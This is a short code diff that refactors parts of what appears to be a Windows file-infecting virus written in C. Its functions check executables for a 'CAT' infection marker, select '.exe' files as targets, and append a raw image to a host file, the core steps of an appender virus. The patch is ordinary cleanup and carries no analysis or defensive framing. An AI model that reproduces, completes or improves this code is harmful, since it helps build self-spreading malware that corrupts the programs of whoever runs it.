@@ -34,11 +34,7 @@ bool checkInfectMark(TCHAR* origfullPath){
 	fread(infectedMark,sizeof(char),sizeof(infectedMark),f_check);
 	fclose(f_check);
 	
-	if(infectedMark[0]=='C'&&infectedMark[1]=='A'&&infectedMark[2]=='T'){
-		return TRUE;
-	}
-	
-	return FALSE;
+	return infectedMark[0]=='C'&&infectedMark[1]=='A'&&infectedMark[2]=='T';
 }
 bool validate(TCHAR* filename){
 	return ! strcmp( filename+strlen(filename)-4 , ".exe");
@@ -55,11 +51,12 @@ void putRawFile(FILE* f_append,char* rawFile,int sizeOfImage){
    		FILE* f_rawimage=fopen(rawFile, "rb");
 		int rch=0; char buffer[25600];
     	while( ( rch=fread(buffer,sizeof(char),sizeof(buffer),f_rawimage) )>0) {
-    		if( rch>=sizeOfImage )rch=sizeOfImage;
-        	fwrite(buffer,sizeof(char),rch,f_append);
+    		
+    		rch=(rch<sizeOfImage)?rch:sizeOfImage;
         	
-        	sizeOfImage-=rch;
-        	if(sizeOfImage==0)break;
+			fwrite(buffer,sizeof(char),rch,f_append);
+        	
+        	if(( sizeOfImage-=rch )==0)break;
    		}
    		fclose(f_rawimage);
 }
